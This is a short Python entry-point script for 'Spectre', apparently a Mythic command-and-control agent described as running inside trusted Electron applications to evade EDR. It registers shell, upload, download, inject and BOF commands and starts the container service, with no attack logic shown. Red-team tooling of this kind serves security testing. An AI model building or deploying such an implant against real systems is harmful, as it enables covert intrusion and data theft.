#!/usr/bin/env python3
"""
Spectre - Mythic Agent Entry Point

JavaScript-based agent that executes within trusted Electron applications
to evade EDR by avoiding shellcode injection entirely.
"""

import mythic_container
from mythic_container import logging as mythic_logging

# Import agent definition and all commands
from mythic.agent_functions.builder import Spectre
from mythic.agent_functions.commands.shell import ShellCommand
from mythic.agent_functions.commands.ls import LsCommand
from mythic.agent_functions.commands.cd import CdCommand
from mythic.agent_functions.commands.pwd import PwdCommand
from mythic.agent_functions.commands.whoami import WhoamiCommand
from mythic.agent_functions.commands.ps import PsCommand
from mythic.agent_functions.commands.upload import UploadCommand
from mythic.agent_functions.commands.download import DownloadCommand
from mythic.agent_functions.commands.exit_cmd import ExitCommand
from mythic.agent_functions.commands.sleep import SleepCommand
from mythic.agent_functions.commands.inject import InjectCommand
from mythic.agent_functions.commands.bof import BofCommand

mythic_logging.logger.info("[*] Spectre agent container starting...")

mythic_container.mythic_service.start_and_run_forever()
